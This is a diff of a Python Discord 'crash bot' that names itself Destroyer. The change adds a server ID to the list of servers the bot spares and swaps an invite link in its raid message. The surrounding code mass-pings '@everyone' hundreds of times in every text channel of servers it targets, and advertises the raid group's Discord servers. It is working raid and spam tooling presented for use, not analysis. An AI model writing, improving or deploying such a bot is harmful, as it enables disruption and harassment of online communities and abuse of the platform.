@@ -35,7 +35,7 @@ async def on_ready():
 	print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
 
 
-whiteservers = [833965619551535116, 817779536057073684]
+whiteservers = [833965619551535116, 817779536057073684, 794102720189169705]
 
 async def act1(ctx):
 	for member in ctx.guild.members:
@@ -164,7 +164,7 @@ async def __spam(ctx):
 		for i in range(500):
 			try:
 				for channel in ctx.guild.text_channels:
-					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/St2Sduy')
+					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/nP6zshxxF4')
 			except:
 				break
 	else:
@@ -190,7 +190,7 @@ async def ex(ctx, *, args):
 async def __current(ctx):
 	if ctx.guild.id not in whiteservers:
 		for i in range(555):
-			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/St2Sduy')
+			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/nP6zshxxF4')
 	else:
 		await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 @client.command(aliases=['settings'])
